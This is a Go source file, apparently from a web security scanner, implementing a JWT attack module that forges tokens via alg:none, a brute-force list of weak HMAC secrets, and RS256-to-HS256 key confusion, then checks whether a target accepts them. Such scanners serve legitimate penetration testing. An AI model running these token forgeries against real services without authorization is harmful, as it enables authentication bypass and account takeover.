package scanner

import (
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/gate-crasher/gate-crasher/internal/analyzer"
	"github.com/gate-crasher/gate-crasher/internal/engine"
)

// WeakSecrets is a list of common JWT secrets used in brute-force probing.
var WeakSecrets = []string{
	"secret", "password", "123456", "changeme", "qwerty", "letmein",
	"admin", "test", "jwt_secret", "your-256-bit-secret",
}

// JWTScanner tests for common JWT vulnerabilities:
//   - Algorithm confusion: alg=none attack
//   - Weak secret brute-force
//   - Key confusion: RS256 → HS256
type JWTScanner struct {
	Engine *engine.Engine
}

// Name returns the module identifier.
func (s *JWTScanner) Name() string { return "jwt" }

// Run executes all JWT attack variants against the target.
func (s *JWTScanner) Run(ctx context.Context, target Target) ([]analyzer.Finding, error) {
	if len(target.Tokens) == 0 {
		return nil, nil
	}

	token := target.Tokens[0]
	if !looksLikeJWT(token) {
		return nil, nil
	}

	baseReq := BuildRequest(target)

	// Baseline – legitimate request
	baseline := s.Engine.Do(ctx, baseReq)
	if baseline.Error != nil {
		return nil, fmt.Errorf("jwt baseline: %w", baseline.Error)
	}

	var findings []analyzer.Finding

	// 1. alg:none attack
	noneToken, err := algNoneToken(token)
	if err == nil {
		f := s.probe(ctx, baseReq, noneToken, baseline,
			"JWT alg:none attack – jwt accepted with no signature (alg=none)",
			analyzer.SeverityCritical)
		if f != nil {
			findings = append(findings, *f)
		}
	}

	// 2. Weak secret brute-force
	for _, secret := range WeakSecrets {
		select {
		case <-ctx.Done():
			return findings, ctx.Err()
		default:
		}

		forgedToken, err := forgeHMACToken(token, secret)
		if err != nil {
			continue
		}
		desc := fmt.Sprintf("JWT weak secret: token forged with secret=%q was accepted", secret)
		f := s.probe(ctx, baseReq, forgedToken, baseline, desc, analyzer.SeverityCritical)
		if f != nil {
			findings = append(findings, *f)
			break // one weak-secret finding is enough
		}
	}

	// 3. RS256 → HS256 key confusion (sign with public key as HMAC secret)
	// We attempt to sign with a dummy PEM-ish string since we don't have the
	// actual public key; the server is vulnerable if it accepts any HS256 token.
	confused, err := rs256ToHS256Token(token)
	if err == nil {
		f := s.probe(ctx, baseReq, confused, baseline,
			"JWT RS256→HS256 key confusion: server may accept HS256 token signed with public key",
			analyzer.SeverityHigh)
		if f != nil {
			findings = append(findings, *f)
		}
	}

	return findings, nil
}

// probe sends a request with the tampered token and checks for acceptance.
func (s *JWTScanner) probe(
	ctx context.Context,
	baseReq engine.Request,
	tampered string,
	baseline engine.Response,
	desc string,
	sev analyzer.Severity,
) *analyzer.Finding {
	req := cloneEngineRequest(baseReq)
	req.Token = tampered

	resp := s.Engine.Do(ctx, req)
	if resp.Error != nil {
		return nil
	}

	// Tampered JWT accepted if we get a 2xx (same class as baseline or better)
	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		f := NewFinding(
			"jwt",
			sev,
			req.URL, req.Method,
			desc,
			fmt.Sprintf("%s %s\nAuthorization: Bearer %s", req.Method, req.URL, tampered[:min(len(tampered), 60)]+"..."),
			analyzer.Snippet(resp.Body, 500),
		)
		return &f
	}

	return nil
}

// looksLikeJWT returns true if the string has three dot-separated base64 parts.
func looksLikeJWT(token string) bool {
	parts := strings.Split(token, ".")
	return len(parts) == 3
}

// jwtParts splits a JWT into its three components.
func jwtParts(token string) (header, payload, sig string, err error) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return "", "", "", fmt.Errorf("not a JWT")
	}
	return parts[0], parts[1], parts[2], nil
}

// decodeHeader base64-decodes a JWT header into a map.
func decodeHeader(encoded string) (map[string]interface{}, error) {
	// Add padding
	padding := (4 - len(encoded)%4) % 4
	encoded += strings.Repeat("=", padding)
	raw, err := base64.URLEncoding.DecodeString(encoded)
	if err != nil {
		return nil, err
	}
	var h map[string]interface{}
	if err := json.Unmarshal(raw, &h); err != nil {
		return nil, err
	}
	return h, nil
}

// encodeSegment base64url-encodes a map as a JWT segment.
func encodeSegment(v interface{}) (string, error) {
	data, err := json.Marshal(v)
	if err != nil {
		return "", err
	}
	return base64.RawURLEncoding.EncodeToString(data), nil
}

// algNoneToken creates an alg:none variant of the given token.
func algNoneToken(token string) (string, error) {
	h, payload, _, err := jwtParts(token)
	if err != nil {
		return "", err
	}

	header, err := decodeHeader(h)
	if err != nil {
		return "", err
	}
	header["alg"] = "none"

	newH, err := encodeSegment(header)
	if err != nil {
		return "", err
	}

	// Return with empty signature
	return newH + "." + payload + ".", nil
}

// forgeHMACToken recreates the token signed with a known weak secret.
func forgeHMACToken(token, secret string) (string, error) {
	h, payload, _, err := jwtParts(token)
	if err != nil {
		return "", err
	}

	// Rebuild header with HS256
	header, err := decodeHeader(h)
	if err != nil {
		return "", err
	}
	header["alg"] = "HS256"

	newH, err := encodeSegment(header)
	if err != nil {
		return "", err
	}

	signingInput := newH + "." + payload
	mac := hmac.New(sha256.New, []byte(secret))
	mac.Write([]byte(signingInput))
	sig := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))

	return signingInput + "." + sig, nil
}

// rs256ToHS256Token creates a key-confusion variant (alg set to HS256 but
// signed with a dummy string representing a "public key").
func rs256ToHS256Token(token string) (string, error) {
	h, payload, _, err := jwtParts(token)
	if err != nil {
		return "", err
	}

	header, err := decodeHeader(h)
	if err != nil {
		return "", err
	}

	// Only attempt if original alg is RS256
	alg, _ := header["alg"].(string)
	if !strings.HasPrefix(alg, "RS") {
		return "", fmt.Errorf("not an RS algorithm")
	}

	header["alg"] = "HS256"
	newH, err := encodeSegment(header)
	if err != nil {
		return "", err
	}

	// Sign with a placeholder "public key" string
	dummyKey := "-----BEGIN PUBLIC KEY-----\nMFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAK\n-----END PUBLIC KEY-----"
	signingInput := newH + "." + payload
	mac := hmac.New(sha256.New, []byte(dummyKey))
	mac.Write([]byte(signingInput))
	sig := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))

	return signingInput + "." + sig, nil
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
